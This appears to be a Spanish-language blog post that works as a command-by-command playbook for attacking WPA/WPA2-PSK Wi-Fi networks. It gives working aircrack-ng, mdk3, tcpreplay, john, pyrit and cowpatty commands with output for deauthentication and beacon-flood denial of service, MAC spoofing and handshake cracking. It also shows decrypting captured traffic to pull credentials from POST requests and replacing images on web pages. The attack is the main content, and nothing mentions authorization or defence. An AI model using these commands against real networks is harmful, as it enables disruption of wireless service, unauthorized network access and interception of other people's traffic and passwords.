---
date: 2021-10-05T04:30:12.000Z
layout: post
comments: true
title: Ataques WPA/WPA2(PSK)
subtitle: 'Redes inalámbricas'
description: >-
image: >-
  http://imgfz.com/i/43bViop.jpeg
optimized_image: >-
  http://imgfz.com/i/43bViop.jpeg
category: ciberseguridad
tags:
  - Wifi
  - monitor
  - hacking
  - redes
author: Felipe Canales Cayuqueo
paginate: true
---

## Modo monitor

### Inicio

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ ifconfig                                                                                                              
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.1.7  netmask 255.255.255.0  broadcast 10.1.1.255
        inet6 fd17:625c:f037:101:c31a:bdc7:b0cb:c208  prefixlen 64  scopeid 0x0<global>
        inet6 fd17:625c:f037:101:a00:27ff:fea6:1f86  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::a00:27ff:fea6:1f86  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:a6:1f:86  txqueuelen 1000  (Ethernet)
        RX packets 16  bytes 4290 (4.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26  bytes 3700 (3.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12  bytes 640 (640.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 640 (640.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 66:9c:d9:a9:f4:c0  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

┌─[root@kali]─[/Documents/WiFi/]
└──╼ airmon-ng start wlan0                                                                                         

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    469 NetworkManager
   5452 wpa_supplicant

PHY	Interface	Driver		Chipset

phy0	wlan0		ath9k_htc	Qualcomm Atheros Communications AR9271 802.11n
		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)

┌─[root@kali]─[/Documents/WiFi/]
└──╼ airmon-ng check kill                                                                                    

Killing these processes:

    PID Name
   5452 wpa_supplicant

┌─[root@kali]─[/Documents/WiFi/]
└──╼ ifconfig wlan0mon up

┌─[root@kali]─[/Documents/WiFi/]
└──╼ ifconfig                                                                                               
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.1.7  netmask 255.255.255.0  broadcast 10.1.1.255
        inet6 fd17:625c:f037:101:c31a:bdc7:b0cb:c208  prefixlen 64  scopeid 0x0<global>
        inet6 fd17:625c:f037:101:a00:27ff:fea6:1f86  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::a00:27ff:fea6:1f86  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:a6:1f:86  txqueuelen 1000  (Ethernet)
        RX packets 16  bytes 4290 (4.1 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 26  bytes 3700 (3.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12  bytes 640 (640.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 640 (640.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-99-36-9E-00-A7-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 748  bytes 190495 (186.0 KiB)
        RX errors 0  dropped 748  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

### Apagado

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airmon-ng stop wlan0mon                                                                                             

PHY	Interface	Driver		Chipset

phy0	wlan0mon	ath9k_htc	Qualcomm Atheros Communications AR9271 802.11n
		(mac80211 station mode vif enabled on [phy0]wlan0)
		(mac80211 monitor mode vif disabled for [phy0]wlan0mon)

┌─[root@kali]─[/Documents/WiFi/]
└──╼ ifconfig                                                                                                          
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.1.7  netmask 255.255.255.0  broadcast 10.1.1.255
        inet6 fd17:625c:f037:101:c31a:bdc7:b0cb:c208  prefixlen 64  scopeid 0x0<global>
        inet6 fd17:625c:f037:101:a00:27ff:fea6:1f86  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::a00:27ff:fea6:1f86  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:a6:1f:86  txqueuelen 1000  (Ethernet)
        RX packets 14  bytes 3640 (3.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 3316 (3.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12  bytes 640 (640.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 640 (640.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 66:9c:d9:a9:f4:c0  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
   
┌─[root@kali]─[/Documents/WiFi/]
└──╼ /etc/init.d/networking restart                                                                                  
Restarting networking (via systemctl): networking.service.  
```

## Falsificación del MAC

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ macchanger -s wlan0mon                                                                                 
Current MAC:   00:cf:ba:91:36:9e (ALFA, INC.)
Permanent MAC: 00:cf:ba:91:36:9e (ALFA, INC.)

┌─[root@kali]─[/Documents/WiFi/]
└──╼ macchanger -l | grep "INSTITUCION"                                                               
8310 - 00:21:95 - J175, INSTITUCION

┌─[root@kali]─[/Documents/WiFi/]
└──╼ ifconfig wlan0mon down

┌─[root@kali]─[/Documents/WiFi/]
└──╼ macchanger --mac=00:21:95:da:ab:97 wlan0mon #[da:ab:97 es random]

┌─[root@kali]─[/Documents/WiFi/]
└──╼ ifconfig wlan0mon up
```

## Captura de paquetes

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng wlan0mon
```

## Filtros con Airodump

### Por canal
```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng -c 5 wlan0mon
```

### Por ESSID
```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng --essid Testing wlan0mon

# Otra opción más rápida es sabiendo el canal.
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng -c 5 --essid Testing wlan0mon
```

### Por BSSID
```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng --bssid D8:5D:4C:FF:CC:5A wlan0mon

# Otra opción más rápida es sabiendo el canal.
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng -c 5 --bssid D8:5D:4C:FF:CC:5A wlan0mon
```
## Exportación de evidencia

```bash
# Se realiza con el parámetro -w
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airodump-ng -c 5 -w nombre --bssid D8:5D:4C:FF:CC:5A wlan0mon 
```
### Modificar canal

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ iwconfig wlan0mon channel 11
```

## Ataque de deautenticación dirigido

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -0 10 -e Testing -c 18:87:40:49:B8:07 wlan0mon
```

| Parámetro | Utilidad |
| :--------: | :-------: |
| -0 | Cantidad de paquetes de desautenticación. |
| -e | ESSID. |
| -c | Cliente (MAC del dispositivo conectado a la red). |


## Ataque de deautenticación global (Broadcast MAC Address)

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -0 10 -e Testing -c FF:FF:FF:FF:FF:FF wlan0mon

# si en vez de 10 colocamos un 0, ningún dispositivo se podrá volver a autenticar hasta que sea cancelado el ataque.
```

## Ataque de falsa autenticación

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ aireplay-ng -1 0 -e Testing -a D8:5D:4C:FF:CC:5A -h 00:0c:f1:da:db:82 wlan0mon
```

| Parámetro | Utilidad |
| :--------: | :-------: |
| -e | ESSID. |
| -a | BSSID. |
| -h | Dirección MAC falsa. (se pueden extraer de macchanger -l) |

## CTS Frame Attack

La finalidad es que el cliente se desconecte y vuelva a conectarse.

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==28" 2>/dev/null 
```

### Filtrar en JSON

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ tshark -r Captura-03.cap -Y "wlan.fc.type_subtype==28" -Tjson 2>/dev/null #Tramas CTS (Clear-to-send)
```

### Filtrar por microsegundos y sin repeticiones

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ tshark -r Captura-03.cap -Y "wlan.fc.type_subtype==28" -Tfields -e wlan.duration 2>/dev/null | sort -u
```

O directamente con WireShark:

![Wireshark wlan](http://imgfz.com/i/xzNhVso.png)

Escogemos cualquiera de estos y lo guardamos en "file", luego a "Export Specified Packets...", para finalmente asignarle un nombre.pcap.

Luego con la utilidad ghex lo editaremos. Primero observamos lo siguiente:

![Ghex Utilidad](http://imgfz.com/i/xzNhVso.png)

Ahora para entender estos números en hexadecimal, empezamos leyendo desde el final, entonces tenemos que los últimos 4 pertenecen al "Frame Check Sequence" o FCS [CB C9 91 69], los siguientes 6 números hexadecimales pertenecen al MAC de la red [18 87 40 49 D8 07] y lo siguientes 2 pertenecen a los microsegundos del paquete [6A 00].

De esto editaremos tanto la MAC (en caso de ser necesario) como los microsegundos del paquete[6A 00  18:87:40:49:D8:07], podemos apoyarnos de python para esto:

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ python
>>> 0x006A #Transformamos el hexadecimal de los microsegundos para ver si corresponde a lo que decía Wireshark y es correcto!
106
>>>

┌─[root@kali]─[/Documents/WiFi/]
└──╼ python3
>>> hex(30000) #Este será por el tiempo que modificaremos los microsegundos.
'0x7530'
>>> 
```

Y reemplazamos estos valores recordando que el hexadecimal que obtuvimos de 30000 se lee al revés osea 30 75, en mi caso la MAC no concuerda con la red por lo que también la modificaré:

![Ghex Edit](http://imgfz.com/i/3x19fw2.png)

Y si lo abrimos con WireShark, podemos comprobar que se realizó el cambio sin errores:

![Comprobación](http://imgfz.com/i/WVA1eC6.png)

Ahora realizaremos el secuestro de ancho de banda (Se recomienda abrir WireShark en wlan0mon o el nombre de su tarjeta en modo monitor, para ver que aplicó los paquetes correctamente):

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ tcpreplay --intf1=wlan0mon --topspeed --loop=2000 ctsframe2.pcap 2>/dev/null
Actual: 2000 packets (100000 bytes) sent in 0.029994 seconds
Rated: 3334000.1 Bps, 26.67 Mbps, 66680.00 pps
Statistics for network device: wlan0mon
	Successful packets:        2000
	Failed packets:            0
	Truncated packets:         0
	Retried packets (ENOBUFS): 0
	Retried packets (EAGAIN):  0
```

| Parámetro | Utilidad |
| :--------: | :-------: |
| --intf1 | Asignar interfaz. |
| --topspeed | Lo más rápido posible. |
| --loop | Cantidad de paquetes que desea emitir. |


Y vemos en WireShark que si emitió correctamente los paquetes:

![Paquetes emitidos](http://imgfz.com/i/yP7LuEp.png)

# Ataque Beacon Flood Mode

Creamos un archivo txt con la siguiente información:

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ for i in $(seq 1 10); do echo "MyNetwork$i" >> redes.txt; done

┌─[root@kali]─[/Documents/WiFi/]
└──╼ cat redes.txt
MyNetwork1
MyNetwork2
MyNetwork3
MyNetwork4
MyNetwork5
MyNetwork6
MyNetwork7
MyNetwork8
MyNetwork9
MyNetwork10
```

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ mdk3 wlan0mon b -f redes.txt -a -s 1000 -c 5

# Si quieres nombres al azar
┌─[root@kali]─[/Documents/WiFi/]
└──╼ mdk3 wlan0mon b -c 5
```

Y se verá de la siguiente forma:


![Beacon](http://imgfz.com/i/q4tJ1bI.jpeg)

| Parámetro | Utilidad |
| :--------: | :-------: |
| b | Asignar interfaz. |
| -f | Asignar fichero. |
| -a | Envía tramas de autenticación a todos los AP que se encuentran en el rango. |
| -c | Seleccione un canal. |

## Ataque disassociation amok mode

Creamos una "blacklist" con las MAC que queremos desautenticar:

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ nano blacklist

18:25:32:45:D8:07 #Pueden ser más de uno
```

Luego ejecutamos el ataque:

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ mdk3 wlan0mon d -w blacklist -c 5
Periodically re-reading blacklist/whitelist every 3 seconds
```

## Ataque Michael Shutdown Exploitation (Funciona solo en routers muy antiguos)

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ mdk3 wlan0mon m -t D8:5D:4C:FF:CC:5A
```

## Detectar handshake con pyrit

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ pyrit -r Captura-02.cap analyze | grep handshake
  #1: Station 18:75:42:47:d8:07, 1 handshake(s): 
```


## Extracción del hash en el handshake con aircrack

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ aircrack-ng -J miCaptura Captura-01.cap 
```

Se extrae con 2John realizando lo siguiente:

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ hccap2john miCaptura.hccap > Hash 
```

## Fuerza bruta con John The Ripper para obtener la contraseña de la red

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ hccap2john miCaptura.hccap > Hash 

┌─[root@kali]─[/Documents/WiFi/]
└──╼ cat Hash
Testing:$WPAPSK$Testing#q3pAzwlO46R.GPU5.2ZwrWaimKBsSwNoeETHCQT8uEoHrTb0aeVNuxsP8Hr49GktxYFC4O5VrM/2iB2efq4hjq0keans67z/hiQXPE21.5I0.Ec............/.2ZwrWaimKBsSwNoeETHCQT8uEoHrTb0aeVNuxsP8Ho.................................................................3X.I.E..1uk0.E..1uk2.E..1uk0....................................................................................................................................................................................../t.....U...9L8mwiU.bycDeSlrk0z82A:18874049b807:d85d4cffcc5a:d85d4cffcc5a::WPA2:miCaptura.hccap

┌─[root@kali]─[/Documents/WiFi/]
└──╼ john --wordlist=/usr/share/wordlists/rockyou.txt Hash

Warning: detected hash type "wpapsk", but the string is also recognized as "wpapsk-pmk"
Use the "--format=wpapsk-pmk" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (key version [0:PMKID 1:WPA 2:WPA2 3:802.11w]) is 2 for all loaded hashes
Will run 3 OpenMP threads
Note: Minimum length forced to 2 by format
Press 'q' or Ctrl-C to abort, almost any other key for status
Hello123         (Testing)
1g 0:00:00:24 DONE (2021-10-03 21:18) 0.04095g/s 6671p/s 6671c/s 6671C/s Lindsay1..GGGGGG
Use the "--show" option to display all of the cracked passwords reliably
Session completed

┌─[root@kali]─[/Documents/WiFi/]
└──╼ john --show Hash           
Testing:Hello123:18874049b807:d85d4cffcc5a:d85d4cffcc5a::WPA2:miCaptura.hccap

1 password hash cracked, 0 left
```

## Fuerza bruta con Aircrack para obtener la contraseña de la red

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap


                               Aircrack-ng 1.6 

      [00:00:30] 164925/14344392 keys tested (5524.94 k/s) 

      Time left: 42 minutes, 46 seconds                          1.15%

                           KEY FOUND! [ Hello123 ]


      Master Key     : DD 19 90 BE A5 30 19 BB 8C 09 14 7D E7 2B B2 F7 
                       22 D0 09 B9 3D B4 02 FA 98 D7 9A 94 C4 76 C8 43 

      Transient Key  : 4B A1 6C E7 03 56 AD F7 47 62 F5 D7 78 DB A0 49 
                       DE 0F 4B 82 81 1B 9E F9 09 6C 83 D9 AA 01 16 8E 
                       E7 02 A1 91 AE CE 5C B5 01 60 99 CA 90 24 5F 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : B5 CA CB CB A0 02 7F A8 3E A7 B1 DF 00 BF 28 43 
```

## Cracking con Pyrit

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ pyrit -r Captura-02.cap -e Testing -i /usr/share/wordlists/rockyou.txt attack_passthrough

Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora
https://github.com/JPaulMora/Pyrit
This code is distributed under the GNU General Public License v3+

Parsing file 'Captura-02.cap' (1/1)...
Parsed 2979 packets (2979 802.11-packets), got 1 AP(s)

Picked AccessPoint d8:5d:4c:ff:cc:5a automatically...
Tried 100005 PMKs so far; 2237 PMKs per second. datalife

The password is 'Hello123'.
```

## Cracking con Cowpatty

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ cowpatty -r Captura-02.cap -f /usr/share/wordlists/rockyou.txt -s Testing

cowpatty 4.8 - WPA-PSK dictionary attack. <jwright@hasborg.com>

Collected all necessary data to mount crack against WPA2/PSK passphrase.
Starting dictionary attack.  Please be patient.
key no. 1000: skittles1
key no. 2000: princess15
key no. 3000: unfaithful
key no. 4000: andresteamo
key no. 5000: hennessy
........

```

## Ataque hcxdumptool

```bash
┌─[root@kali]─[/opt/xerosploit]
└──╼ hcxdumptool -i wlan0mon -o Capture --enable_status=1 

┌─[root@kali]─[/opt/xerosploit]
└──╼ hcxpcaptool -z myHashes Capture

# Luego se realiza ataque de fuerza bruta
```


## Cracking con Airolib

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airolib-ng passwords-airolib --import passwd /usr/share/wordlists/rockyou.txt

┌─[root@kali]─[/Documents/WiFi/]
└──╼ file passwords-airolib

#Se le hace "echo" al nombre de la red
┌─[root@kali]─[/Documents/WiFi/]
└──╼ echo "Testing" > essid.lst

┌─[root@kali]─[/Documents/WiFi/]
└──╼ airolib-ng passwords-airolib --import essid essid.lst

┌─[root@kali]─[/Documents/WiFi/]
└──╼ airolib-ng passwords-airolib --stats

┌─[root@kali]─[/Documents/WiFi/]
└──╼ airolib-ng passwords-airolib --clean all

┌─[root@kali]─[/Documents/WiFi/]
└──╼ airolib-ng passwords-airolib --batch
Batch processing... #Este paso demora bastante, ya que está cargando el diccionario a la base de datos.

┌─[root@kali]─[/Documents/WiFi/]
└──╼ aircrack-ng -r passwords-airolib Captura-01.cap
# La fuerza bruta será mucho más rápido de lo normal.
```

## Creación de una Rainbow Table con GenPMK

Este proceso hará extremadamente rápido el proceso de fuerza bruta.

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ genpmk -f  /usr/share/wordlists/rockyou.txt -s Testing -d dic.genpmk

# Con Cowpatty
┌─[root@kali]─[/Documents/WiFi/]
└──╼ cowpatty -d dic.genpmk -r Captura-01.cap -s Testing

# Con Pyrit
┌─[root@kali]─[/Documents/WiFi/]
└──╼ pyrit -e Testing -i dic.genpmk -r Captura-01.cap attack_cowpatty
```

## Cracking con Pyrit a través de ataque por base de datos

Este ataque de fuerza bruta es el más rápido de todos.

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ pyrit -i /usr/share/wordlists/rockyou.txt import_passwords

┌─[root@kali]─[/Documents/WiFi/]
└──╼ pyrit -e Testing create_essid

┌─[root@kali]─[/Documents/WiFi/]
└──╼ pyrit batch #Este proceso se va a demorar bastante.

┌─[root@kali]─[/Documents/WiFi/]
└──╼ pyrit -r Captura-01.cap atack_db
```

## Desencriptado de paquetes con Airdecap (espionaje)

```bash
┌─[root@kali]─[/Documents/WiFi/]
└──╼ airdecap-ng -e Testing -p Hello123 Captura-01.cap

┌─[root@kali]─[/Documents/WiFi/]
└──╼ tshark -r Captura-01-dec.cap -Y "http" 2>/dev/null

┌─[root@kali]─[/Documents/WiFi/]
└──╼ tshark -r Captura-01-dec.cap -Y "dns" 2>/dev/null

┌─[root@kali]─[/Documents/WiFi/]
└──╼ tshark -r Captura-01-dec.cap -Y "http.request.method==POST" 2>/dev/null

#Para ver el contenido

┌─[root@kali]─[/Documents/WiFi/]
└──╼ tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tjson 2>/dev/null

#Otra forma una vez encontramos credenciales

┌─[root@kali]─[/Documents/WiFi/]
└──╼ tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tfields -e http.file_data 2>/dev/null
```

## Reemplazado de imágenes web con Xerosploit

```bash
┌─[root@kali]─[/opt/xerosploit]
└──╼ python xerosplooit.py

Xero => scan

Xero => 192.168.0.11

Xero => replace

Xero => run

Xero => /home/user/Desktop/image.jpeg
```

